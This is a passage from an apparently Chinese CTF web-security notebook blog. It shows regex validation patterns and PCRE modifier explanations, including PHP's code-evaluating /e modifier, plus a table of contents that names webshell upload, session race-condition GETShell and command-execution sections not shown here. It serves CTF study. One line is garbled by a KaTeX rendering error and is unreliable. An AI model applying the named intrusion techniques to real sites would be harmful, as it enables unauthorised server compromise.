或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$</span></span><br><span class="line"><span class="string">16. 非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$</span></span><br><span class="line"><span class="string">17. 正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$</span></span><br><span class="line"><span class="string">18. 负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$</span></span><br><span class="line"><span class="string">19. 浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">二、校验字符的表达式</span></span><br><span class="line"><span class="string">1. 汉字：^[\u4e00-\u9fa5]&#123;0,&#125;$</span></span><br><span class="line"><span class="string">2. 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$</span></span><br><span class="line"><span class="string">3. 长度为3-20的所有字符：^.&#123;3,20&#125;$</span></span><br><span class="line"><span class="string">4. 由26个英文字母组成的字符串：^[A-Za-z]+$</span></span><br><span class="line"><span class="string">5. 由26个大写英文字母组成的字符串：^[A-Z]+$</span></span><br><span class="line"><span class="string">6. 由26个小写英文字母组成的字符串：^[a-z]+$</span></span><br><span class="line"><span class="string">7. 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$</span></span><br><span class="line"><span class="string">8. 由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w&#123;3,20&#125;$</span></span><br><span class="line"><span class="string">9. 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$</span></span><br><span class="line"><span class="string">10. 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]&#123;2,20&#125;$</span></span><br><span class="line"><span class="string">11. 可以输入含有^%&amp;&#x27;,;=?$\&quot;等字符：[^%&amp;&#x27;,;=?$\x22]+ 12 禁止输入含有~的字符：[^~\x22]+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">三、特殊需求表达式</span></span><br><span class="line"><span class="string">1. Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$</span></span><br><span class="line"><span class="string">2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?</span></span><br><span class="line"><span class="string">3. InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$</span></span><br><span class="line"><span class="string">4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d&#123;8&#125;$</span></span><br><span class="line"><span class="string">5. 电话号码(&quot;</span>XXX-XXXXXXX<span class="string">&quot;、&quot;</span>XXXX-XXXXXXXX<span class="string">&quot;、&quot;</span>XXX-XXXXXXX<span class="string">&quot;、&quot;</span>XXX-XXXXXXXX<span class="string">&quot;、&quot;</span>XXXXXXX<span class="string">&quot;和&quot;</span>XXXXXXXX)：^(\(\d&#123;3,4&#125;-)|\d&#123;3.4&#125;-)?\d&#123;7,8&#125;$</span><br><span class="line">6. 国内电话号码(0511-4405222、021-87888822)：\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;</span><br><span class="line">7. 身份证号(15位、18位数字)：^\d&#123;15&#125;|\d&#123;18&#125;$</span><br><span class="line">8. 短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$</span><br><span class="line">9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$</span><br><span class="line">10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w&#123;5,17&#125;$</span><br><span class="line">11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$</span><br><span class="line">12. 日期格式：^\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;</span><br><span class="line">13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$</span><br><span class="line">14. 一个月的31天(01～09和1～31)：^((<span class="number">0</span>?[<span class="number">1</span>-<span class="number">9</span>])|((<span class="number">1</span>|<span class="number">2</span>)[<span class="number">0</span>-<span class="number">9</span>])|<span class="number">30</span>|<span class="number">31</span>)$</span><br><span class="line"><span class="number">15</span>. 钱的输入格式：</span><br><span class="line"><span class="number">16</span>. <span class="number">1</span>.有四种钱的表示形式我们可以接受:&quot;<span class="number">10000.00</span>&quot; 和 &quot;<span class="number">10</span>,<span class="number">000.00</span>&quot;, 和没有 &quot;分&quot; 的 &quot;<span class="number">10000</span>&quot; 和 &quot;<span class="number">10</span>,<span class="number">000</span>&quot;：^[<span class="number">1</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]*$</span><br><span class="line"><span class="number">17</span>. <span class="number">2</span>.这表示任意一个不以<span class="number">0</span>开头的数字,但是,这也意味着一个字符&quot;<span class="number">0</span>&quot;不通过,所以我们采用下面的形式：^(<span class="number">0</span>|[<span class="number">1</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]*)$</span><br><span class="line"><span class="number">18</span>. <span class="number">3</span>.一个<span class="number">0</span>或者一个不以<span class="number">0</span>开头的数字.我们还可以允许开头有一个负号：^(<span class="number">0</span>|-?[<span class="number">1</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]*)$</span><br><span class="line"><span class="number">19</span>. <span class="number">4</span>.这表示一个<span class="number">0</span>或者一个可能为负的开头不为<span class="number">0</span>的数字.让用户以<span class="number">0</span>开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[<span class="number">0</span>-<span class="number">9</span>]+(.[<span class="number">0</span>-<span class="number">9</span>]+)?$</span><br><span class="line"><span class="number">20</span>. <span class="number">5</span>.必须说明的是,小数点后面至少应该有<span class="number">1</span>位数,所以&quot;<span class="number">10</span>.&quot;是不通过的,但是 &quot;<span class="number">10</span>&quot; 和 &quot;<span class="number">10.2</span>&quot; 是通过的：^[<span class="number">0</span>-<span class="number">9</span>]+(.[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">2</span>&#125;)?$</span><br><span class="line"><span class="number">21</span>. <span class="number">6</span>.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[<span class="number">0</span>-<span class="number">9</span>]+(.[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;)?$</span><br><span class="line"><span class="number">22</span>. <span class="number">7</span>.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;(,[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">3</span>&#125;)*(.[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;)?$</span><br><span class="line"><span class="number">23</span> <span class="number">8.1</span>到<span class="number">3</span>个数字,后面跟着任意个 逗号+<span class="number">3</span>个数字,逗号成为可选,而不是必须：^([<span class="number">0</span>-<span class="number">9</span>]+|[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;(,[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">3</span>&#125;)*)(.[<span class="number">0</span>-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;)?$</span><br><span class="line"><span class="number">24</span>. 备注：这就是最终结果了,别忘了&quot;+&quot;可以用&quot;*&quot;替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</span><br><span class="line"><span class="number">25</span>. xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-<span class="number">9</span>]+\\.[x|X][m|M][l|L]$</span><br><span class="line"><span class="number">26</span>. 中文字符的正则表达式：[\u4e00-\u9fa5]</span><br><span class="line"><span class="number">27</span>. 双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计<span class="number">2</span>，ASCII字符计<span class="number">1</span>))</span><br><span class="line">28. 空白行的正则表达式：\n\s*\r (可以用来删除空白行)</span><br><span class="line">29. HTML标记的正则表达式：&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)</span><br><span class="line">30. 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)</span><br><span class="line">31. 腾讯QQ号：[1-9][0-9]&#123;4,&#125; (腾讯QQ号从10000开始)</span><br><span class="line">32. 中国邮政编码：[1-9]\d&#123;5&#125;(?!\d) (中国邮政编码为6位数字)</span><br><span class="line">33. IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用)</span><br><span class="line">34. IP地址：((?:(?:<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\\d|[<span class="number">01</span>]?\\d?\\d)\\.)&#123;<span class="number">3</span>&#125;(?:<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\\d|[<span class="number">01</span>]?\\d?\\d))</span><br></pre></td></tr></table></figure>

<h2 id="修饰符匹配"><a href="#修饰符匹配" class="headerlink" title="修饰符匹配"></a>修饰符匹配</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i (PCRE_CASELESS)</span><br><span class="line"></span><br><span class="line">如果设置了这个修饰符, 模式中的字母会进行大小写不敏感匹配.</span><br><span class="line"></span><br><span class="line">m (PCRE_MULTILINE)</span><br><span class="line"></span><br><span class="line">默认情况下, PCRE认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行), <span class="string">&quot;行首&quot;</span>元字符(^)仅匹配字符串的开始位置, 而<span class="string">&quot;行末&quot;</span>元字符(KaTeX parse error: Undefined control sequence: \n at position 143: …符. 如果目标字符串 中没有<span class="string">&quot;\̲n̲&quot;</span>字符, 或者模式中没有出现^…, 设置这个修饰符不产生任何影响.</span><br><span class="line"></span><br><span class="line">s (PCRE_DOTALL)</span><br><span class="line"></span><br><span class="line">如果设置了这个修饰符, 模式中的点号元字符匹配所有字符, 包含换行符. 如果没有这个 修饰符, 点号不匹配换行符. 这个修饰符等同于perl中的/s修饰符.一个取反字符类比如 [^a]总是匹配换行符, 而不依赖于这个修饰符的设置.</span><br><span class="line"></span><br><span class="line">x (PCRE_EXTENDED)</span><br><span class="line"></span><br><span class="line">如果设置了这个修饰符, 模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略, 并且位于一个未转义的字符类外部的<span class="comment">#字符和下一个换行符之间的字符也被忽略. 这个修饰符 等同于perl中的/x修饰符, 使被编译模式中可以包含注释. 注意: 这仅用于数据字符. 空白字符 还是不能在模式的特殊字符序列中出现, 比如序列(?(引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误. 比如( ?(就会导致错误.).</span></span><br><span class="line"></span><br><span class="line">e (PREG_REPLACE_EVAL)</span><br><span class="line"></span><br><span class="line">如果这个修饰符设置了, preg_replace()在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php代码评估执行(<span class="built_in">eval</span>函数方式), 并使用执行结果 作为实际参与替换的字符串. 单引号, 双引号, 反斜线()和NULL字符在后向引用替换时会被用反斜线转义.</span><br><span class="line"></span><br><span class="line">Tip</span><br><span class="line"></span><br><span class="line">请确保replacement参数由合法php代码字符串组成, 否则php将会 在preg_replace()调用的行上 产生一个解释错误.</span><br><span class="line"></span><br><span class="line">Note: 仅 preg_replace()使用此修饰符, 其他PCRE函数忽略此修饰符.</span><br><span class="line"></span><br><span class="line">A (PCRE_ANCHORED)</span><br><span class="line"></span><br><span class="line">如果设置了这个修饰符, 模式被强制为<span class="string">&quot;锚定&quot;</span>模式, 也就是说约束匹配使其仅从 目标字符串的开始位置搜索. 这个效果同样可以使用适当的模式构造出来,并且 这也是perl种实现这种模式的唯一途径.</span><br><span class="line"></span><br><span class="line">D (PCRE_DOLLAR_ENDONLY)</span><br><span class="line"></span><br><span class="line">如果这个修饰符被设置, 模式中的元字符美元符号仅仅匹配目标字符串的末尾. 如果这个修饰符 没有设置, 当字符串以一个换行符结尾时, 美元符号还会匹配该换行符(但不会匹配之前的任何换行符). 如果设置了修饰符m, 这个修饰符被忽略. 在perl中没有与此修饰符等同的修饰符.</span><br><span class="line"></span><br><span class="line">S</span><br><span class="line"></span><br><span class="line">当一个模式需要多次使用的时候, 为了得到匹配速度的提升, 值得花费一些时间 对其进行一些额外的分析. 如果设置了这个修饰符, 这个额外的分析就会执行. 当前, 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符).</span><br><span class="line"></span><br><span class="line">U (PCRE_UNGREEDY)</span><br><span class="line"></span><br><span class="line">这个修饰符逆转了量词的<span class="string">&quot;贪婪&quot;</span>模式. 使量词默认为非贪婪的, 通过量词后紧跟?的方式可以使其成为贪婪的. 这和perl是不兼容的. 它同样可以使用 模式内修饰符设置(?U)进行设置, 或者在量词后以问号标记其非贪婪(比如.*?).</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">在非贪婪模式, 通常不能匹配超过 pcre.backtrack_limit的字符.</span><br><span class="line"></span><br><span class="line">X (PCRE_EXTRA)</span><br><span class="line"></span><br><span class="line">这个修饰符打开了PCRE与perl不兼容的附件功能. 模式中的任意反斜线后就ingen一个 没有特殊含义的字符都会导致一个错误, 以此保留这些字符以保证向后兼容性. 默认 情况下, 在perl中, 反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文. 当前没有其他特性由这个修饰符控制.</span><br><span class="line"></span><br><span class="line">J (PCRE_INFO_JCHANGED)</span><br><span class="line"></span><br><span class="line">内部选项设置(?J)修改本地的PCRE_DUPNAMES选项. 允许子组重名. (译注:只能通过内部选项设置, 外部的/J设置会产生错误.)</span><br><span class="line"></span><br><span class="line">u (PCRE8)</span><br><span class="line"></span><br><span class="line">此修正符打开一个与perl不兼容的附加功能. 模式字符串被认为是utf-8的. 这个修饰符 从unix版php 4.1.0或更高, win32版php 4.2.3开始可用. php 4.3.5开始检查模式的utf-8合法性. This modifier turns on additional functionality of PCRE that is incompatible with Perl. Pattern strings are treated as UTF-8. This modifier is available from PHP 4.1.0 or greater on Unix and from PHP 4.2.3 on win32. UTF-8 validity of the pattern is checked since PHP 4.3.5.</span><br></pre></td></tr></table></figure>







<h1 id="应该留点心的赛题"><a href="#应该留点心的赛题" class="headerlink" title="应该留点心的赛题"></a>应该留点心的赛题</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[GYCTF2020]FlaskApp</span><br><span class="line">[安洵杯 2019]easy_serialize_php</span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">矢幽武</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/30/CTF-web-book-001/">http://example.com/2023/08/30/CTF-web-book-001/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">矢幽武博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/web-book/">web-book</a></div><div class="post_share"><div class="social-share" data-image="/img/backgroude/b25.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/01/SEC-tool-0006/" title="SEC-超级快速的搭建DVWS云主机"><img class="cover" src="/img/backgroude/b45.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SEC-超级快速的搭建DVWS云主机</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/28/CTF-misc-book-001/" title="CTF-misc汇总-001"><img class="cover" src="/img/backgroude/b12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF-misc汇总-001</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/13/CTF-web-book-003/" title="CTF之Web总结--协议&#x2F;系统&#x2F;环境"><img class="cover" src="/img/backgroude/b29.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-13</div><div class="title">CTF之Web总结--协议&#x2F;系统&#x2F;环境</div></div></a></div><div><a href="/2023/07/30/CTF-web-book-002/" title="CTF之Web总结--工具"><img class="cover" src="/img/backgroude/b34.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-30</div><div class="title">CTF之Web总结--工具</div></div></a></div><div><a href="/2023/08/13/CTF-web-033/" title="CTF之Web习题-CTFShow-web78~web218"><img class="cover" src="/img/backgroude/b40.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-13</div><div class="title">CTF之Web习题-CTFShow-web78~web218</div></div></a></div><div><a href="/2024/02/06/CVE-Study-01/" title="CVE-相关靶场测试学习"><img class="cover" src="/img/backgroude/b21.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">CVE-相关靶场测试学习</div></div></a></div><div><a href="/2023/11/29/CTF-web-035/" title="CTF之Web习题--033--某赛题"><img class="cover" src="/img/backgroude/b1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-29</div><div class="title">CTF之Web习题--033--某赛题</div></div></a></div><div><a href="/2023/10/09/CTF-web-034/" title="CTF之Web习题--032--BUU练习题"><img class="cover" src="/img/backgroude/b2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-09</div><div class="title">CTF之Web习题--032--BUU练习题</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">矢幽武</div><div class="author-info__description">生灵造物，百力奋心<br>机遇自争，各凭本事<br>没有攻不破的系统 ，<br> 只有不努力的黑客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">201</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">30</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/linxiao-wangchuan"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><b><font color="#e66b6d">威</font> <font color="#e66d98">武</font> <font color="#e66cc6">不</font> <font color="#cc6de6">屈</font> ,<font color="#9770e6">成</font> <font color="#6d93e6">为</font> <font color="#6fcde6">自</font> <font color="#72e6b6">己</font> <font color="#72e689">不败的</font> <font color="#99e670">信条</font>, <font color="#cde670">剑</font> <font color="#e6df72">走</font> <font color="#e6c073">偏</font> <font color="#e6a271">锋</font> ,<font color="#e6796f">缥</font> <font color="#e65454">缈</font> <font color="#e63333">孤</font> <font color="#e62c2c">鸿</font> <font color="#e60101">影</font> <font color="#e60101"> --孤志</font></b> <p align="center"><img src="https://haiyong.site/img/img-blog.csdnimg.cn/f7384c88956d4378b72e47548e19c9f8.gif" width="50" alt="mao"></p> <p align="center" style="color:yellow;font-weight:800">微信号：无</p> <p align="center" style="color:red;font-weight:800">QQ：无</p> -------------------------------- <p style="color:#5a1216;font-weight:800">每日更新指南：</p> <p style="color:#4d1018;font-weight:800">刷题/记录总知识一般会沿用上次的文档</p> <p style="color:#f03752;font-weight:800">学习新知将新开文档</p></div></div><div class="xpand" style="height:10px;"></div><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">基本收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.</span> <span class="toc-text">nginx相关配置信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80"><span class="toc-number">1.3.</span> <span class="toc-text">关键文件后缀</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%ACphp-%E6%8B%BF%E4%B8%8B%E5%90%8E%E5%8F%B0"><span class="toc-number">2.1.</span> <span class="toc-text">上传木马php,拿下后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%88%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">上传配置文件（修改配置环境）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%87%E6%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text">文件上传之数据包过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%B6%E5%AE%83%E7%89%A9%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">文件上传其它物件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC"><span class="toc-number">2.5.1.</span> <span class="toc-text">jpg二次渲染脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#png%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC"><span class="toc-number">2.5.2.</span> <span class="toc-text">png二次渲染脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.6.</span> <span class="toc-text">文件上传之条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.6.1.</span> <span class="toc-text">Session条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%B8%AD%E7%9A%84session-upload-progress"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">php中的session.upload_progress</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Session%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%9Aweb82"><span class="toc-number">2.6.2.</span> <span class="toc-text">Session相关信息：web82~?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">2.6.2.1.</span> <span class="toc-text">前置信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Session-Upload-Progress"><span class="toc-number">2.6.2.2.</span> <span class="toc-text">Session Upload Progress</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B7%E4%BE%8B"><span class="toc-number">2.6.2.3.</span> <span class="toc-text">样例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.6.2.4.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%88%9D%E5%A7%8B%E4%B8%80%E4%B8%AA%E9%9A%8F%E6%9C%BAsessionid"><span class="toc-number">2.6.2.4.1.</span> <span class="toc-text">方法1：初始一个随机sessionid</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9AGETShell"><span class="toc-number">2.6.2.4.2.</span> <span class="toc-text">方法2：GETShell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E4%BC%AA%E9%80%A0"><span class="toc-number">3.1.</span> <span class="toc-text">数据包伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">php可执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%A0%E5%8F%82-%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">PHP传参+绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82%E6%B6%89%E5%8F%8A%E7%9A%84php%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.</span> <span 